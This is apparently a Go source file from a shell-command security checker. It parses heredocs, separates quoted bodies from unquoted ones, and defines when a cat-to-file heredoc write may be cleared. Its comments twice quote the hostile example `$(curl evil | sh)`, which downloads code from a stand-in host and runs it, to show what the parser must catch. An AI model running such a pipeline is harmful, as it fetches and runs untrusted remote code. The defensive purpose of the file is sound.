package cmdparse

import (
	"regexp"
	"strings"
)

// Heredoc extents, made FIRST-CLASS in the parser (pg2-r2rf3).
//
// splitCompound splits a command body on '\n', so before this pass a heredoc BODY
// was shredded into pseudo-leaves: every line of what is merely DATA became its own
// "command", and prose like `the .git/index is 0 bytes` was handed to the rule chain
// as a command whose executable is `the`. That was masked downstream by
// engine.EvaluateExpression early-returning Abstain on the first HasHeredoc leaf —
// but that early return fired on the FIRST heredoc leaf and DISCARDED any decision an
// earlier leaf had already produced, so `grep <gitmeta> x && cat <<EOF` and
// `cat <<EOF && grep <gitmeta> x` reached different verdicts for the same pair of
// operations. A security decision cannot depend on which side of `&&` a heredoc sits
// on.
//
// The fix is structural: stripHeredocBodies removes each heredoc's body (and its
// terminator line) from the text BEFORE splitCompound ever sees it, and records the
// extent on the owning leaf. Body text therefore reaches neither splitCompound (no
// pseudo-leaves) nor tokenize (no pseudo-ARGS either — the second half of the same
// defect: a body line naming a path would otherwise land in Args and be judged as an
// operand).
//
// QUOTED vs UNQUOTED delimiters are not cosmetic, they decide whether the body is
// executable text:
//
//   - `<<'EOF'` / `<<"EOF"` / `<<\EOF` — ANY quoting of ANY part of the delimiter word
//     makes the body ENTIRELY LITERAL. bash performs no expansion, so a `$(...)` in
//     the body is inert data and MUST NOT be evaluated (evaluating it manufactures
//     false positives out of prose, e.g. a bug report quoting a shell command).
//   - `<<EOF` — the body undergoes parameter expansion AND command substitution, so a
//     `$(curl evil | sh)` in the body genuinely EXECUTES and MUST still be evaluated.
//
// Getting that backwards either misses a real injection or invents a false positive,
// so Quoted is recorded per heredoc and the engine recurses only the unquoted bodies
// (see ParsedCommand.UnquotedHeredocBodies).
type Heredoc struct {
	// Delimiter is the delimiter word with its quoting REMOVED — the text a
	// terminator line must equal.
	Delimiter string
	// Quoted reports that the delimiter word carried quoting, i.e. the body is
	// literal and undergoes NO expansion.
	Quoted bool
	// StripTabs is the `<<-` form: leading TABS are stripped from body lines and,
	// load-bearing here, from the terminator line — so an indented terminator is
	// still recognised and the body extent does not run to end of input.
	StripTabs bool
	// Body is the body text verbatim (the terminator line excluded), exactly as it
	// appeared in the source.
	Body string
	// Terminated reports that a terminator line was found. An UNTERMINATED heredoc
	// swallows the rest of the input as body — the safe direction, since the
	// alternative is shredding those lines back into commands.
	Terminated bool
	// Substitutions are this body's OWN top-level substitutions, pre-lowered
	// during the SAME parse that produced this heredoc (ADR 0039 step 4,
	// pg2-1019a) by walking the already-parsed Redirect.Hdoc word directly —
	// never by re-parsing Body via cmdparse.ScanSubstitutionsInHeredocBody.
	// Always empty when Quoted: a quoted delimiter's body never expands, so
	// bash never evaluates a `$( )` inside it (pg2-wguam).
	Substitutions []Substitution
}

// DELETED, and the deletion is a coverage claim: `isHeredocWordEnd`, `atWordStart`,
// `parseHeredocOperator`, `readHeredocBody`, `heredocSpan`, `scanHeredocs`,
// `stripHeredocBodies`, `StripCommentsPreservingHeredocs` and
// `countHeredocOperators`.
//
// `stripHeredocBodies` is ADR 0039's NAMED INSTANCE of root cause 2 — a pass that
// returns a MODIFIED STRING. Its purest consequence: a leaf's `Raw` was post-strip
// text, so re-parsing it re-derived a heredoc extent that was no longer terminated.
// I12 removes that by making `Raw` the exact SOURCE slice of the owning statement,
// body included, and `FuzzShellParseSeam`'s Raw-reparse invariant is what now owns
// the property `FuzzStripHeredocBodies` used to assert.
//
// `atWordStart` was ADR 0039's UNREPRESENTABLE PREDICATE: a POSITIONAL word-start
// test that had to agree with `splitCompound`'s STATEFUL one, and could not express
// "after a flushed subshell". That disagreement produced the phantom heredoc of
// `(<)#<<0`. There is now ONE word-start notion, the grammar's, so there is no
// second predicate to disagree with the first.
//
// `StripCommentsPreservingHeredocs` existed only because the engine's per-line
// comment strip had to be taught where heredoc bodies were. Under
// KeepComments(true) a comment is a parser fact and a body is a `Redirect.Hdoc`
// node, so neither needs a text pass and the engine strips nothing at all.
//
// The `Heredoc` TYPE and `UnquotedHeredocBodies` are RETAINED: they are the extent
// RECORD the seam populates from `Redirect.Word`/`Redirect.Hdoc` and the engine's
// I2/I3 discriminator reads. They derive no structure from text.

// UnquotedHeredocBodies returns the bodies of this leaf's heredocs whose delimiter
// was UNQUOTED — the bodies bash performs parameter expansion and COMMAND
// SUBSTITUTION on, and therefore the only heredoc text that can execute. The engine
// recurses each through the full rule chain, so `cat <<EOF` with `$(curl evil | sh)`
// in its body is still judged, while the same bytes under `cat <<'EOF'` are literal
// data and are never treated as a command.
func (pc ParsedCommand) UnquotedHeredocBodies() []string {
	var out []string
	for _, hd := range pc.Heredocs {
		if hd.Quoted || hd.Body == "" {
			continue
		}
		out = append(out, hd.Body)
	}
	return out
}

// UnquotedHeredocSubstitutions returns the pre-lowered top-level substitutions
// of every UNQUOTED heredoc body on this leaf (ADR 0039 step 4, pg2-1019a) —
// the structural counterpart to UnquotedHeredocBodies, feeding the engine's
// heredoc-body recursion so it never needs cmdparse.ScanSubstitutionsInHeredocBody
// to re-parse a body this leaf's own parse already walked.
func (pc ParsedCommand) UnquotedHeredocSubstitutions() []Substitution {
	var out []Substitution
	for _, hd := range pc.Heredocs {
		if hd.Quoted {
			continue
		}
		out = append(out, hd.Substitutions...)
	}
	return out
}

// simpleParamExpansion matches the only `${...}` spelling an unquoted heredoc body
// may carry and still clear HeredocFileWriteCleared: a bare `${NAME}`. Every other
// brace form either evaluates (`${x@P}` runs command substitutions found in x's
// value, `${x:1}` / `${x[$(c)]}` evaluate an arithmetic index) or hides a
// substitution the engine's own recursion does not see as one.
var simpleParamExpansion = regexp.MustCompile(`\$\{[A-Za-z_][A-Za-z0-9_]*\}`)

// heredocBodyExpansionsModeled reports whether every expansion this heredoc's body
// can perform is one the engine already judges.
//
// A QUOTED body expands nothing, so it is always modeled. An UNQUOTED body expands
// `$NAME`/`${NAME}` (inert: no evaluation of the value), `$(...)` and backticks
// (recursed by the engine through Heredoc.Substitutions, so an unsafe inner command
// still denies), and a few forms that EVALUATE variable text: arithmetic `$((...))`
// and `$[...]`, and any `${...}` carrying an operator, index or transform. Those last
// are NOT modeled by the heredoc recursion, so a body holding one is refused here and
// stays on the heredoc floor. The scan is textual and deliberately over-refuses (a
// `${x:-y}` inside a recursed `$(...)` is refused too): the failure direction is the
// abstain floor, never an approve.
func heredocBodyExpansionsModeled(hd Heredoc) bool {
	if hd.Quoted {
		return true
	}
	rest := simpleParamExpansion.ReplaceAllString(hd.Body, "")
	return !strings.Contains(rest, "${") &&
		!strings.Contains(rest, "$((") &&
		!strings.Contains(rest, "$[")
}

// HeredocFileWriteCleared reports whether leaf is a FILE WRITE of a heredoc body:
// `cat > FILE <<'EOF' ... EOF` and `cat >> FILE <<'EOF' ... EOF` (operator ruling,
// Phillip, 2026-10-25, bead pg2-4godq: the pattern is fine in general). It is the
// FILE-WRITE sibling of HeredocReaderCleared (which refuses every write redirection)
// and is consumed by the engine's heredocFloor ("THE FOURTH NARROWING").
//
// SIX CONDITIONS, ALL REQUIRED:
//
//  1. At least one heredoc extent, and no herestring (`<<<`) anywhere on the leaf: a
//     herestring records no extent, so its word would be an expansion nobody screened.
//  2. The leaf's executable is on heredocReaderAllowlist (`cat`, `/bin/cat`): a
//     program that merely copies stdin to stdout and cannot execute the body.
//  3. EVERY extent's expansions are modeled (heredocBodyExpansionsModeled): a quoted
//     body is literal; an unquoted one may expand only what the engine recurses.
//  4. No write flag, and argv carries bare flags only (readerArgsClearance must be
//     SubstitutionCleared): a positional file operand on the SAME leaf makes `cat`
//     emit that FILE instead of the body, an arbitrary-file-copy route.
//  5. Every redirection is a WRITE: a `<` read could replace the heredoc as cat's
//     stdin.
//  6. At least one redirection captures stdout into a real file (CapturesStdout). A
//     leaf that writes no file is `cat <<'EOF'` to the terminal, a shape this
//     function deliberately does NOT admit: it stays on the heredoc floor.
//
// WHAT THIS DOES NOT DECIDE: whether the target FILE may be written. That verdict is
// the engine's evaluateRedirections, folded most-restrictive-wins with whatever this
// admission earns, so a target outside the write allowlist (or a dynamically
// expanded one) still abstains or denies. Admitting the leaf here only stops the
// heredoc floor from masking that verdict.
func HeredocFileWriteCleared(leaf ParsedCommand) bool {
	if len(leaf.Heredocs) == 0 || !heredocReaderAllowlist[leaf.Executable] {
		return false
	}
	if strings.Contains(leaf.Raw, "<<<") {
		return false
	}
	for _, hd := range leaf.Heredocs {
		if !heredocBodyExpansionsModeled(hd) {
			return false
		}
	}
	if hasWriteFlag(leaf.Executable, leaf.Args) || readerArgsClearance(leaf.Args) != SubstitutionCleared {
		return false
	}
	for _, rd := range leaf.Redirections {
		if !rd.Kind.IsWrite() {
			return false
		}
	}
	return CapturesStdout(leaf)
}
